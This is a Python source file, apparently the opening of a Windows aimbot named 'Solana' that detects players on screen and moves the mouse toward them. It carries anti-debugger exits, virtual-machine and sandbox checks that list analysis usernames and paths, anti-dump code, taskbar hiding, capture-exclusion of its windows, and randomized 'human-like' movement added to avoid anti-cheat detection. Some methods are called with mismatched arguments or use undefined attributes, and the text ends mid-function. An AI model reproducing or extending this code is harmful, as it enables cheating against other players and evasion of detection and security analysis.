# ============================================
# HIGH DPI SCALING SETUP - MUST BE FIRST
# ============================================
import os
import sys

# Set environment variables BEFORE any Qt imports
os.environ['QT_ENABLE_HIGHDPI_SCALING'] = '1'
os.environ['QT_AUTO_SCREEN_SCALE_FACTOR'] = '1'
os.environ['QT_SCALE_FACTOR_ROUNDING_POLICY'] = 'RoundPreferFloor'

# Now import Qt and set the policy IMMEDIATELY
from PyQt6.QtCore import Qt
from PyQt6.QtWidgets import QApplication

# Set High DPI policy BEFORE any QApplication instance is created
QApplication.setHighDpiScaleFactorRoundingPolicy(Qt.HighDpiScaleFactorRoundingPolicy.RoundPreferFloor)

# ============================================
# STANDARD LIBRARY IMPORTS
# ============================================
import ctypes
import ctypes.wintypes as wintypes
import glob
import hashlib
import json
import math
import os
import platform
import queue
import random
import sys
import threading
import time
import tkinter as tk
import tkinter.font as tkFont
from ctypes import windll
from enum import Enum
from tkinter import Canvas
from typing import Any, Dict, List, Optional, Tuple
import binascii
import subprocess
from datetime import datetime, timezone, timedelta

# ============================================
# THIRD-PARTY IMPORTS
# ============================================
import cpuinfo
import cv2
import bettercam
import cupy as cp
import gpustat
import hid
import numpy as np
import requests
import torch
import torchvision
import torchvision.transforms as transforms
import urllib3
import win32api
import win32con
import win32gui
import win32security
from filterpy.kalman import KalmanFilter
from PIL import Image
from termcolor import colored
from ultralytics import YOLO
import qrcode
from discord_interactions import verify_key

# ============================================
# CONDITIONAL IMPORTS WITH ERROR HANDLING
# ============================================
# Controller support imports
VGAMEPAD_AVAILABLE = False
XINPUT_AVAILABLE = False

try:
    import vgamepad as vg
    VGAMEPAD_AVAILABLE = True
except Exception:
    vg = None

try:
    import XInput
    XINPUT_AVAILABLE = True
except ImportError:
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "XInput-Python"], 
                      capture_output=True, text=True)
        import XInput
        XINPUT_AVAILABLE = True
    except:
        XInput = None

# Windows-specific imports
if os.name == 'nt':
    try:
        import curses
        import wmi
    except ImportError:
        curses = None
        wmi = None

try:
    import pyfiglet
    import colorama
    from colorama import Fore
except ImportError:
    pyfiglet = None
    colorama = None
    Fore = None

# ============================================
# QT MESSAGE HANDLER - Define early
# ============================================
def qt_message_handler(mode, context, message):
    # Ignore QPainter warnings
    if "QPainter" in message:
        return
    # Print other messages
    print(message)

# Install the message handler immediately after Qt imports
from PyQt6.QtCore import qInstallMessageHandler
qInstallMessageHandler(qt_message_handler)

# ============================================
# GLOBAL CONSTANTS AND CONFIGURATION
# ============================================
CONFIG_PATH = "lib/config/config.json"
DEV_MODE = True
CONTROLLER_MESSAGES_SHOWN = False
ENABLE_PROCESS_CRITICAL = False

# Global variables
mouse_dev = None
last_click_time = 0

# ============================================
# SECURITY CHECKS - MUST BE FIRST
# ============================================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    print("[!] Running as administrator")
    print("[!] Disabling critical process features for safety")
    ENABLE_PROCESS_CRITICAL = False
else:
    ENABLE_PROCESS_CRITICAL = False

def init_security():
    """Initialize all security measures at program start"""
    
    # 1. Anti-Debug Checks (Windows only)
    if os.name == 'nt':
        kernel32 = ctypes.WinDLL('kernel32')
        
        # Check for debugger
        if kernel32.IsDebuggerPresent():
            print("Error code: 1")
            sys.exit(1)
        
        # Check for Python debugger
        if 'pydevd' in sys.modules:
            print("Error code: 2")
            sys.exit(1)
        
        # Check for trace
        if sys.gettrace() is not None:
            print("Error code: 3")
            sys.exit(1)

init_security()

# ============================================
# UTILITY FUNCTIONS
# ============================================
def show_error_message(message: str) -> None:
    """Show Windows error message box"""
    MB_OK = 0
    MB_ICONERROR = 16
    ctypes.windll.user32.MessageBoxW(None, message, 'Error', MB_OK | MB_ICONERROR)

def make_request(url: str) -> bool:
    """Make HTTP request and handle errors"""
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return True
    except requests.exceptions.HTTPError as http_err:
        error_msg = f'HTTP error occurred: {http_err}'
        print(error_msg)
        show_error_message(error_msg)
        return False
    except requests.exceptions.ConnectionError as conn_err:
        error_msg = f'Connection error occurred: {conn_err}'
        return False
    except requests.exceptions.Timeout as timeout_err:
        error_msg = f'Timeout error occurred: {timeout_err}'
        print(error_msg)
        show_error_message(error_msg)
        return False
    except Exception as err:
        error_msg = f'Other error occurred: {err}'
        print(error_msg)
        show_error_message(error_msg)
        return False

def restart_program():
    print('Restarting, please wait...')
    executable = sys.executable
    os.execv(executable, ['python'] + sys.argv)

def check_installation_status():
    """Check if packages have been installed before"""
    marker_file = '.packages_installed'
    
    if os.path.exists(marker_file):
        try:
            with open(marker_file, 'r') as f:
                data = json.load(f)
                return data.get('installed', False)
        except:
            return False
    return False

def mark_installation_complete():
    """Mark that packages have been installed"""
    marker_file = '.packages_installed'
    
    data = {
        'installed': True,
        'installation_date': time.strftime('%Y-%m-%d %H:%M:%S'),
        'python_version': sys.version
    }
    
    with open(marker_file, 'w') as f:
        json.dump(data, f, indent=2)

def check_critical_packages():
    """Quick check for critical packages to verify installation"""
    critical_packages = [
        'torch',
        'ultralytics',
        'cv2',
        'PyQt6',
        'bettercam',
        'keyauth'
    ]
    
    missing_packages = []
    for package in critical_packages:
        try:
            if package == 'cv2':
                import cv2
            else:
                __import__(package)
        except ImportError:
            missing_packages.append(package)
    
    return len(missing_packages) == 0, missing_packages

def install_process():
    print('\nInstalling required packages, please wait...\n')
    
    requirements_content = """
matplotlib>=3.2.2
numpy==1.23.0
opencv-python>=4.1.2
Pillow
PyYAML>=5.3.1
scipy>=1.4.1
tqdm>=4.41.0
tensorboard>=2.4.1
seaborn>=0.11.0
pandas
PyQt5
PyQt6
filterpy
bettercam
dxcam
protobuf==4.21.0
ipython
ultralytics
pyserial

mss
pygame
pynput
pywin32
requests
wheel
termcolor
gpustat
py-cpuinfo
pyautogui
wmi
keyauth
pyfiglet
hidapi
qrcode
discord_interactions
windows-curses
vgamepad
XInput-Python
customtkinter
tensorrt"""
    
    with open('temp_requirements.txt', 'w') as f:
        f.write(requirements_content)
    
    try:
        print('Installing packages from requirements...')
        os.system(f'{sys.executable} -m pip install -r temp_requirements.txt --no-cache-dir --disable-pip-version-check')
        
        os.remove('temp_requirements.txt')
        
        print('\nSuccessfully installed packages')
        
        mark_installation_complete()
        
        print('\nRestarting program...')
        time.sleep(1)
        restart_program()
        
    except Exception as e:
        print(f'Error during installation: {e}')
        if os.path.exists('temp_requirements.txt'):
            os.remove('temp_requirements.txt')

def initialize_packages():
    """Main function to handle package installation check"""
    if check_installation_status():
        packages_ok, missing = check_critical_packages()
        
        if packages_ok:
            return True
        else:
            print(f'Missing packages detected: {", ".join(missing)}')
            print('Reinstalling...')
            if os.path.exists('.packages_installed'):
                os.remove('.packages_installed')
            install_process()
            return False
    else:
        print('First time setup detected')
        install_process()
        return False

if not initialize_packages():
    sys.exit(0)

def qt_message_handler(mode, context, message):
    # Ignore QPainter warnings
    if "QPainter" in message:
        return
    # Print other messages
    print(message)

# ============================================
# PROCESS HIDING IMPLEMENTATION
# ============================================

class ProcessHider:
    """Hide process from task manager and process lists"""
    
    def __init__(self):
        self.hidden = False
        if os.name == 'nt':
            self.kernel32 = ctypes.WinDLL('kernel32')
            self.user32 = ctypes.WinDLL('user32')
    
    def hide_from_taskbar(self, hwnd):
        """Hide window from taskbar"""
        if os.name != 'nt':
            return
        
        try:
            # Remove from taskbar
            GWL_EXSTYLE = -20
            WS_EX_APPWINDOW = 0x00040000
            WS_EX_TOOLWINDOW = 0x00000080
            
            ex_style = self.user32.GetWindowLongW(hwnd, GWL_EXSTYLE)
            ex_style = ex_style & ~WS_EX_APPWINDOW | WS_EX_TOOLWINDOW
            self.user32.SetWindowLongW(hwnd, GWL_EXSTYLE, ex_style)
            
            # Hide from Alt+Tab
            self.user32.ShowWindow(hwnd, 0)  # SW_HIDE
            self.user32.ShowWindow(hwnd, 1)  # SW_SHOW
            
        except Exception as e:
            print(f"Warning: Could not hide from taskbar: {e}")
    
    def set_process_critical(self):
        """DISABLED - This function causes BSOD"""
        # DO NOT mark process as critical
        # This will cause BSOD when the process terminates
        print("[!] Process critical mode disabled for safety")
        return
    
    def hide_process(self):
        """Apply all hiding techniques"""
        if self.hidden:
            return
        
        if os.name == 'nt':
            # Set process priority
            try:
                import psutil
                p = psutil.Process()
                p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
            except:
                pass
            
            self.hidden = True

# ============================================
# ENHANCED ANTI-DETECTION
# ============================================

class AdvancedAntiDetection:
    @staticmethod
    def randomize_timing():
        """Add randomized micro-delays to avoid detection"""
        import random
        time.sleep(random.uniform(0.001, 0.003))
    
    @staticmethod
    def jitter_movement(x, y):
        """Add subtle jitter to movement for more human-like behavior"""
        import random
        jitter_x = random.uniform(-0.5, 0.5)
        jitter_y = random.uniform(-0.5, 0.5)
        return x + jitter_x, y + jitter_y
    
    @staticmethod
    def check_virtual_machine():
        """Check if running in a virtual machine"""
        if os.name != 'nt':
            return False
        
        # Check for VM artifacts
        vm_signs = [
            "VMware", "VirtualBox", "Virtual", "Xen",
            "QEMU", "Hyper-V", "Parallels", "innotek GmbH"
        ]
        
        try:
            import wmi
            c = wmi.WMI()
            
            # Check BIOS
            for bios in c.Win32_BIOS():
                for sign in vm_signs:
                    if sign.lower() in str(bios.Manufacturer).lower():
                        return True
                    if sign.lower() in str(bios.SerialNumber).lower():
                        return True
            
            # Check Computer System
            for cs in c.Win32_ComputerSystem():
                for sign in vm_signs:
                    if sign.lower() in str(cs.Manufacturer).lower():
                        return True
                    if sign.lower() in str(cs.Model).lower():
                        return True
        except:
            pass
        
        return False
    
    @staticmethod
    def check_sandbox():
        """Check for sandbox environments"""
        # Check for sandbox usernames
        sandbox_users = [
            "sandbox", "virus", "malware", "test",
            "john doe", "currentuser", "admin"
        ]
        
        current_user = os.getenv('USERNAME', '').lower()
        for user in sandbox_users:
            if user in current_user:
                return True
        
        # Check for sandbox paths
        sandbox_paths = [
            r"C:\agent",
            r"C:\sandbox",
            r"C:\iDEFENSE",
            r"C:\cuckoo"
        ]
        
        for path in sandbox_paths:
            if os.path.exists(path):
                return True
        
        return False
    
    @staticmethod
    def anti_dump():
        """Prevent memory dumping"""
        if os.name != 'nt':
            return
        
        try:
            kernel32 = ctypes.WinDLL('kernel32')
            
            # Set DEP policy
            DEP_ENABLE = 0x00000001
            kernel32.SetProcessDEPPolicy(DEP_ENABLE)
            
            # Disable SetUnhandledExceptionFilter
            kernel32.SetUnhandledExceptionFilter(None)
            
        except Exception as e:
            print(f"Warning: Anti-dump error: {e}")

class StreamProofManager:
    """Manages stream-proof functionality for Qt windows"""
    
    def __init__(self):
        self.enabled = False
        self.protected_windows = {}
        self.qt_widgets = []  # Store Qt widget references
        
        # Windows constants
        self.WDA_NONE = 0x00000000
        self.WDA_EXCLUDEFROMCAPTURE = 0x00000011
        
        # Setup ctypes for SetWindowDisplayAffinity
        self.user32 = ctypes.windll.user32
        self.user32.SetWindowDisplayAffinity.argtypes = [wintypes.HWND, wintypes.DWORD]
        self.user32.SetWindowDisplayAffinity.restype = wintypes.BOOL
        
    def register_qt_window(self, qt_widget):
        """Register a Qt window for stream-proof protection"""
        if qt_widget not in self.qt_widgets:
            self.qt_widgets.append(qt_widget)
    
    def enable(self):
        """Enable stream-proof mode"""
        if self.enabled:
            print("[!] Stream-proof already enabled")
            return True
            
        success = self._apply_stream_proof()
        if success:
            self.enabled = True
        else:
            print("[-] Failed to enable stream-proof mode")
            self.enabled = False
        return success
        
    def disable(self):
        """Disable stream-proof mode"""
        if not self.enabled:
            print("[!] Stream-proof already disabled")
            return
            
        self._remove_stream_proof()
        self.enabled = False
        
    def toggle(self):
        """Toggle stream-proof mode"""
        if self.enabled:
            self.disable()
        else:
            self.enable()
        return self.enabled
            
    def _apply_stream_proof(self):
        """Apply stream-proof to registered windows"""
        try:
            found_windows = False
            
            # First, try Qt widget method
            for qt_widget in self.qt_widgets:
                if qt_widget and qt_widget.isVisible():
                    try:
                        # Get the window handle from Qt
                        hwnd = int(qt_widget.winId())
                        window_title = qt_widget.windowTitle()
                        
                        # For Qt windows, we need to use a different approach
                        # Try SetWindowDisplayAffinity with Windows 10 1903+ method
                        result = self._apply_display_affinity(hwnd, window_title)
                        
                        if result:
                            self.protected_windows[hwnd] = {
                                'title': window_title,
                                'qt_widget': qt_widget,
                                'method': 'display_affinity'
                            }
                            found_windows = True
                        else:
                            # Try alternative method for Qt windows
                            result = self.apply_qt_protection(qt_widget, hwnd, window_title)
                            if result:
                                self.protected_windows[hwnd] = {
                                    'title': window_title,
                                    'qt_widget': qt_widget,
                                    'method': 'qt_protection'
                                }
                                found_windows = True
                                
                    except Exception as e:
                        print(f"[-] Error protecting Qt window: {e}")
            
            # Also search for Solana windows that might not be registered
            self._find_and_protect_additional_windows()
            
            return found_windows or len(self.protected_windows) > 0
                    
        except Exception as e:
            print(f"[-] Error in stream-proof application: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def _apply_display_affinity(self, hwnd, title):
        """Apply display affinity protection"""
        try:
            # Try newer Windows 10 1903+ API
            result = self.user32.SetWindowDisplayAffinity(hwnd, self.WDA_EXCLUDEFROMCAPTURE)
            if result:
                return True
            else:
                # Try with WDA_MONITOR flag as fallback
                result = self.user32.SetWindowDisplayAffinity(hwnd, 0x00000001)
                if result:
                    print(f"[+] Display affinity (monitor) applied to: {title}")
                    return True
                    
                error_code = ctypes.get_last_error()
                print(f"[-] SetWindowDisplayAffinity failed for {title}. Error: {error_code}")
                return False
                
        except Exception as e:
            print(f"[-] Display affinity error: {e}")
            return False

    def _apply_windows_display_affinity(self, w):
        try:
            import sys
            if sys.platform != "win32":
                return
            from ctypes import windll, wintypes
            hwnd = int(w.windowHandle().winId())
            WDA_NONE = 0x00
            WDA_MONITOR = 0x01
            WDA_EXCLUDEFROMCAPTURE = 0x11

            if not windll.user32.SetWindowDisplayAffinity(wintypes.HWND(hwnd), WDA_EXCLUDEFROMCAPTURE):
                windll.user32.SetWindowDisplayAffinity(wintypes.HWND(hwnd), WDA_MONITOR)
        except Exception:
            pass

    def _apply_on_gui(self, qt_widget, title):
        from PyQt6.QtCore import Qt
        try:
            w = qt_widget.window()
            original_flags = w.windowFlags()
            w.setWindowFlags(original_flags | Qt.WindowType.Tool)
            w.setAttribute(Qt.WidgetAttribute.WA_ShowWithoutActivating, True)

            was_visible = w.isVisible()
            if was_visible:
                w.hide()
            w.show()

            # Note the self. here
            self._apply_windows_display_affinity(w)

            print(f"[+] Qt protection applied to: {title}")
            return True
        except Exception as e:
            print(f"[-] Qt protection error: {e}")
            return False

    def apply_qt_protection(self, qt_widget, title):
        from PyQt6.QtWidgets import QApplication
        from PyQt6.QtCore import Qt, QThread

        app = QApplication.instance()
        if app is None:
            print("[-] Qt protection error: QApplication not yet created")
            return False

        if QThread.currentThread() != app.thread():
            from PyQt6.QtCore import QMetaObject, Qt as QtCoreQt
            ok = []
            def _do():
                ok.append(self._apply_on_gui(qt_widget, title))
            QMetaObject.invokeMethod(app, _do, QtCoreQt.ConnectionType.QueuedConnection)
            app.processEvents()
            return bool(ok and ok[0])
        else:
            return self._apply_on_gui(qt_widget, title)
    
    def _find_and_protect_additional_windows(self):
        """Find and protect Solana windows not registered as Qt widgets"""
        try:
            protected_titles = [
                "Solana",         # Debug window
                "Solana Debug"    # Alternative debug window name
            ]
            
            def enum_windows_callback(hwnd, _):
                if win32gui.IsWindowVisible(hwnd):
                    try:
                        window_title = win32gui.GetWindowText(hwnd)
                        if window_title and hwnd not in self.protected_windows:
                            for title in protected_titles:
                                if title == window_title or title in window_title:
                                    print(f"[DEBUG] Found additional window: {window_title} (HWND: {hwnd})")
                                    
                                    # Try display affinity
                                    if self._apply_display_affinity(hwnd, window_title):
                                        self.protected_windows[hwnd] = {
                                            'title': window_title,
                                            'qt_widget': None,
                                            'method': 'display_affinity'
                                        }
                                    break
                    except:
                        pass
                return True
                
            win32gui.EnumWindows(enum_windows_callback, None)
            
        except Exception as e:
            print(f"[-] Error finding additional windows: {e}")
            
    def _remove_stream_proof(self):
        """Remove stream-proof from protected windows"""
        try:
            from PyQt6.QtCore import Qt
            
            for hwnd, info in list(self.protected_windows.items()):
                try:
                    if info['method'] == 'display_affinity':
                        # Remove display affinity
                        self.user32.SetWindowDisplayAffinity(hwnd, self.WDA_NONE)
                    
                    elif info['method'] == 'qt_protection' and info['qt_widget']:
                        # Restore Qt window to normal
                        qt_widget = info['qt_widget']
                        if qt_widget:
                            # Remove tool window flag if it was added
                            flags = qt_widget.windowFlags()
                            qt_widget.setWindowFlags(flags & ~Qt.WindowType.Tool)
                            qt_widget.show()
                            print(f"[+] Qt protection removed from: {info['title']}")
                            
                except Exception as e:
                    print(f"[-] Error removing protection from {info['title']}: {e}")
                    
            self.protected_windows.clear()
            
        except Exception as e:
            print(f"[-] Error removing stream-proof: {e}")

class MovementCurveType(Enum):
    """Supported movement curve types"""
    BEZIER = "Bezier"
    B_SPLINE = "B-Spline"
    CATMULL = "Catmull"
    EXPONENTIAL = "Exponential"
    HERMITE = "Hermite"
    SINE = "Sine"

class MovementCurves:
    """Advanced movement curves for natural mouse movement simulation"""
    
    def __init__(self):
        self.supported_curves = [curve.value for curve in MovementCurveType]
        self.current_curve = MovementCurveType.BEZIER
        
        # Optimized parameters for speed
        self.curve_params = {
            "bezier_control_randomness": 0.1,  # Less deviation
            "spline_smoothness": 0.2,  # Less smoothing
            "catmull_tension": 0.2,  # Less tension
            "exponential_decay": 3.0,  # Faster decay
            "hermite_tangent_scale": 0.5,  # Less curve
            "sine_frequency": 2.0,  # Faster oscillation
            "curve_steps": 5,  # Fewer steps
            "speed_multiplier": 1.0,  # Additional speed control
            "aimlock_mode": True  # Enable aimlock-like behavior
        }

    def set_aimlock_mode(self, enabled: bool):
        """Toggle between aimlock mode (fast) and humanized mode (slower)"""
        self.curve_params["aimlock_mode"] = enabled
        
        if enabled:
            # Fast settings for aimlock
            self.curve_params["curve_steps"] = 3
            self.curve_params["bezier_control_randomness"] = 0.05
            self.curve_params["speed_multiplier"] = 2.0
        else:
            # Normal humanized settings
            self.curve_params["curve_steps"] = 20
            self.curve_params["bezier_control_randomness"] = 0.3
            self.curve_params["speed_multiplier"] = 1.0
    
    def set_curve_type(self, curve_type: str) -> bool:
        """Set the movement curve type"""
        try:
            # Handle both string values and enum values
            if isinstance(curve_type, str):
                # Try to match by value
                for curve in MovementCurveType:
                    if curve.value == curve_type:
                        self.current_curve = curve
                        return True
                # If no match, try direct enum creation
                self.current_curve = MovementCurveType(curve_type)
            else:
                self.current_curve = curve_type
            return True
        except ValueError:
            print(f"[-] Invalid curve type: {curve_type}")
            # Default to Bezier if invalid
            self.current_curve = MovementCurveType.BEZIER
            return False
    
    def get_supported_curves(self) -> List[str]:
        """Get list of supported movement curves"""
        return self.supported_curves
    
    def generate_fast_movement_path(self, start_x: float, start_y: float, 
                               end_x: float, end_y: float, 
                               max_steps: int = 5) -> List[Tuple[float, float]]:
        """Generate a fast movement path with minimal steps for aimlock-like behavior"""
        distance = math.sqrt((end_x - start_x)**2 + (end_y - start_y)**2)
    
        # Very few steps for speed
        steps = min(max_steps, max(2, int(distance / 30)))
    
        path = []
    
        for i in range(steps + 1):
            t = i / steps
        
            # Simple interpolation based on curve type
            if self.current_curve == MovementCurveType.BEZIER:
                # Fast bezier with minimal deviation
                ctrl_offset = 0.1  # Much smaller than before
                ctrl_x = start_x + (end_x - start_x) * 0.5 + (end_x - start_x) * ctrl_offset * 0.5
                ctrl_y = start_y + (end_y - start_y) * 0.5 + (end_y - start_y) * ctrl_offset * 0.5
            
                x = (1-t)**2 * start_x + 2*(1-t)*t * ctrl_x + t**2 * end_x
                y = (1-t)**2 * start_y + 2*(1-t)*t * ctrl_y + t**2 * end_y
            
            elif self.current_curve == MovementCurveType.SINE:
                # Fast sine interpolation
                sine_t = t  # Linear with slight sine influence
                sine_influence = 0.05 * math.sin(t * math.pi)
                sine_t = t + sine_influence
            
                x = start_x + (end_x - start_x) * sine_t
                y = start_y + (end_y - start_y) * sine_t
            
            elif self.current_curve == MovementCurveType.EXPONENTIAL:
                # Fast exponential
                exp_t = 1 - math.exp(-3 * t)  # Faster exponential curve
                x = start_x + (end_x - start_x) * exp_t
                y = start_y + (end_y - start_y) * exp_t
            
            else:
                # Nearly linear for other curves (fast)
                mod_t = t * 0.95 + 0.05 * t * t  # Slight curve
                x = start_x + (end_x - start_x) * mod_t
                y = start_y + (end_y - start_y) * mod_t
        
            path.append((x, y))
    
        return path
    
    def execute_curve_movement_fast(self, path):
        """Execute movement path as fast as possible for aimlock-like behavior"""
        if len(path) < 2 or self.mouse_method.lower() != "hid":
            return
    
        try:
            # No delays between movements for maximum speed
            cumulative_x = 0.0
            cumulative_y = 0.0
        
            # Skip intermediate points if path is too long
            step_size = max(1, len(path) // 5)  # Take every nth point for speed
        
            for i in range(1, len(path), step_size):
                if not self.running:
                    break
            
                # Calculate movement to this point
                target_x = path[i][0]
                target_y = path[i][1]
            
                move_x = target_x - cumulative_x
                move_y = target_y - cumulative_y

                # CLAMP VALUES BEFORE CONVERSION
                clamped_x = max(-127, min(127, move_x))
                clamped_y = max(-127, min(127, move_y))
            
                int_move_x = int(round(clamped_x))
                int_move_y = int(round(clamped_y))
            
                if abs(int_move_x) > 0 or abs(int_move_y) > 0:
                    move_mouse(int_move_x, int_move_y)
                    cumulative_x += int_move_x
                    cumulative_y += int_move_y
        
            # Final movement to exact target
            if len(path) > 1:
                final_x = path[-1][0]
                final_y = path[-1][1]
            
                final_move_x = final_x - cumulative_x
                final_move_y = final_y - cumulative_y

                # CLAMP FINAL MOVEMENT
                clamped_final_x = max(-127, min(127, final_move_x))
                clamped_final_y = max(-127, min(127, final_move_y))

                int_final_x = int(round(clamped_final_x))
                int_final_y = int(round(clamped_final_y))
            
                if abs(int_final_x) > 0 or abs(int_final_y) > 0:
                    move_mouse(int_final_x, int_final_y)
                
        except Exception as e:
            print(f"[-] Error in fast curve movement: {e}")
    
    def update_curve_parameters(self, **kwargs):
        """Update curve generation parameters"""
        for key, value in kwargs.items():
            if key in self.curve_params:
                self.curve_params[key] = value
                print(f"[+] Updated {key} to {value}")
            else:
                print(f"[-] Unknown parameter: {key}")
    
    def get_curve_parameters(self) -> dict:
        """Get current curve parameters"""
        return self.curve_params.copy()
    
    def random_curve_type(self) -> str:
        """Get a random curve type"""
        curve_type = random.choice(list(MovementCurveType))
        self.current_curve = curve_type
        return curve_type.value
    
    def calculate_movement_speed(self, path: List[Tuple[float, float]]) -> List[float]:
        """Calculate speed profile for a movement path"""
        if len(path) < 2:
            return [0.0]
        
        speeds = []
        for i in range(len(path) - 1):
            dx = path[i+1][0] - path[i][0]
            dy = path[i+1][1] - path[i][1]
            speed = math.sqrt(dx*dx + dy*dy)
            speeds.append(speed)
        
        # Add final speed (same as last)
        speeds.append(speeds[-1] if speeds else 0.0)
        
        return speeds
    
    def smooth_path(self, path: List[Tuple[float, float]], smoothing_factor: float = 0.3) -> List[Tuple[float, float]]:
        """Apply smoothing to reduce jitter in movement path"""
        if len(path) < 3:
            return path
        
        smoothed = [path[0]]  # Keep first point
        
        for i in range(1, len(path) - 1):
            # Simple moving average smoothing
            prev_x, prev_y = path[i-1]
            curr_x, curr_y = path[i]
            next_x, next_y = path[i+1]
            
            smooth_x = curr_x + smoothing_factor * ((prev_x + next_x) / 2 - curr_x)
            smooth_y = curr_y + smoothing_factor * ((prev_y + next_y) / 2 - curr_y)
            
            smoothed.append((smooth_x, smooth_y))
        
        smoothed.append(path[-1])  # Keep last point
        return smoothed
    
    def apply_curve_to_movement(self, move_x: float, move_y: float, distance: float, max_distance: float = 100.0) -> Tuple[float, float]:
        """Apply curve interpolation directly to movement values"""
        if distance == 0:
            return move_x, move_y
        
        # Normalize distance for interpolation parameter
        t = min(1.0, distance / max_distance)
        
        if self.current_curve == MovementCurveType.BEZIER:
            # Simple quadratic ease-in-out
            if t < 0.5:
                mod = 2 * t * t
            else:
                mod = -1 + (4 - 2 * t) * t
            move_x *= mod
            move_y *= mod
            
        elif self.current_curve == MovementCurveType.SINE:
            # Sine wave modulation
            sine_mod = (math.sin((t - 0.5) * math.pi) + 1) / 2
            move_x *= sine_mod
            move_y *= sine_mod
            
        elif self.current_curve == MovementCurveType.EXPONENTIAL:
            # Exponential modulation
            if t < 0.5:
                exp_mod = math.pow(2 * t, self.curve_params["exponential_decay"]) / 2
            else:
                exp_mod = 1 - math.pow(2 * (1 - t), self.curve_params["exponential_decay"]) / 2
            move_x *= exp_mod
            move_y *= exp_mod
        
        # For other curves, return unmodified (they work better with full path generation)
        
        return move_x, move_y

class CompactVisuals(threading.Thread):
    """Compact debug window integrated with AimbotController"""
    
    def __init__(self, cfg):
        # Always call Thread.__init__() first
        super(CompactVisuals, self).__init__()
        
        self.cfg = cfg
        self.queue = queue.Queue(maxsize=1)
        self.daemon = True
        self.name = 'CompactVisuals'
        self.image = None
        self.running = False
        
        # Window settings - keep it small like original
        self.window_width = getattr(cfg, 'detection_window_width', 320)
        self.window_height = getattr(cfg, 'detection_window_height', 320)
        self.window_name = getattr(cfg, 'debug_window_name', 'Solana Debug')
        self.scale_percent = getattr(cfg, 'debug_window_scale_percent', 100)
        
        # GPU acceleration flags
        self.cuda_available = False
        self.opencl_available = False
        self.directx_available = False
        self.quicksync_available = False
        self.gpu_backend = "cpu"
        self.gpu_frame = None
        
        # Set interpolation if window is enabled
        if getattr(cfg, 'show_window', False):
            self.interpolation = cv2.INTER_NEAREST
            
    def start_visuals(self):
        """Start the compact visuals thread"""
        if getattr(self.cfg, 'show_window', False) and not self.running:
            self.running = True
            if not self.is_alive():  # Only start if thread hasn't been started yet
                self.start()

    def stop_visuals(self):
        """Stop the compact visuals"""
        if self.running:
            self.running = False
            # Send None to queue to signal stop
            try:
                self.queue.put_nowait(None)
            except:
                pass

    def run(self):
        """Main compact visuals loop"""
        try:
            if getattr(self.cfg, 'show_window', False):
                self.spawn_debug_window()
                prev_frame_time = 0
                
            while self.running:
                try:
                    # Non-blocking queue check with timeout
                    try:
                        self.image = self.queue.get(timeout=0.001)  # 1ms timeout
                    except queue.Empty:
                        # Process events to keep window responsive
                        if getattr(self.cfg, 'show_window', False):
                            key = cv2.waitKey(1) & 0xFF
                            if key == ord('q'):
                                self.running = False
                                break
                        time.sleep(0.001)  # Small sleep to prevent high CPU usage
                        continue
                    
                    if self.image is None:
                        self.destroy()
                        break
                    
                    # Calculate and draw FPS
                    if getattr(self.cfg, 'show_window_fps', True):
                        new_frame_time = time.time()
                        if prev_frame_time > 0:
                            fps = 1 / (new_frame_time - prev_frame_time)
                            # Create a copy to avoid modifying the original frame
                            display_image = self.image.copy()
                            cv2.putText(display_image, f'FPS: {int(fps)}', 
                                       (10, 20), cv2.FONT_HERSHEY_SIMPLEX, 0.6, (0, 255, 0), 1, cv2.LINE_AA)
                            self.image = display_image
                        prev_frame_time = new_frame_time
                    
                    # Display the image with GPU acceleration if available
                    if getattr(self.cfg, 'show_window', False):
                        self.display_frame_optimized()
                            
                        # Non-blocking event processing
                        key = cv2.waitKey(1) & 0xFF
                        if key == ord('q'):
                            self.running = False
                            break
                            
                except Exception as e:
                    print(f"Compact visuals error: {e}")
                    time.sleep(0.01)
        
        except Exception as e:
            print(f"Fatal error in compact visuals: {e}")
        finally:
            self.destroy()

    def spawn_debug_window(self):
        """Create compact debug window with CUDA detection"""
        cv2.namedWindow(self.window_name)
        
        # Enable optimizations and check for CUDA
        self.setup_gpu_acceleration()
        
        # Set window properties after GPU setup
        self.set_window_properties()
    
    def setup_gpu_acceleration(self):
        """Setup GPU acceleration with multiple GPU backend detection"""
        try:
            # Enable OpenCV optimizations
            cv2.setUseOptimized(True)
            
            # Try different GPU acceleration methods
            gpu_backend_found = False
            
            # 1. Try CUDA first (NVIDIA)
            try:
                cuda_devices = cv2.cuda.getCudaEnabledDeviceCount()
                if cuda_devices > 0:
                    print(f"[+] CUDA devices detected: {cuda_devices}")
                    cv2.cuda.setDevice(0)
                    
                    # Test CUDA functionality
                    test_gpu_mat = cv2.cuda_GpuMat()
                    test_data = np.zeros((10, 10), dtype=np.uint8)
                    test_gpu_mat.upload(test_data)
                    _ = test_gpu_mat.download()
                    
                    print("[+] CUDA acceleration enabled")
                    self.cuda_available = True
                    self.gpu_backend = "cuda"
                    gpu_backend_found = True
                else:
                    print("[-] No CUDA devices found")
            except (AttributeError, Exception) as e:
                print(f"[-] CUDA not available: {e}")
            
            # 2. Try OpenCL (Works with NVIDIA, AMD, Intel)
            if not gpu_backend_found:
                try:
                    # Check if OpenCL is available
                    if cv2.ocl.haveOpenCL():
                        cv2.ocl.setUseOpenCL(True)
                        if cv2.ocl.useOpenCL():
                            # Test OpenCL functionality
                            test_mat = np.zeros((100, 100), dtype=np.uint8)
                            test_umat = cv2.UMat(test_mat)
                            _ = cv2.resize(test_umat, (50, 50))
                            
                            # Get OpenCL device info
                            try:
                                platforms = cv2.ocl.getPlatformsInfo()
                                if platforms:
                                    print(f"[+] OpenCL Platform: {platforms[0]['name'] if platforms else 'Unknown'}")
                            except (AttributeError, Exception):
                                # Fallback for versions without getPlatformsInfo
                                print("[+] OpenCL acceleration enabled")
                                try:
                                    device = cv2.ocl.Device.getDefault()
                                    print(f"[+] OpenCL Device: {device.name()}")
                                except:
                                    print("[+] OpenCL Device: Available")
                                
                            self.cuda_available = False
                            self.opencl_available = True
                            self.gpu_backend = "opencl"
                            gpu_backend_found = True
                        else:
                            print("[-] OpenCL available but failed to enable")
                    else:
                        print("[-] OpenCL not available")
                except Exception as e:
                    print(f"[-] OpenCL setup error: {e}")
            
            # 3. Try DirectX/Direct3D (Windows only)
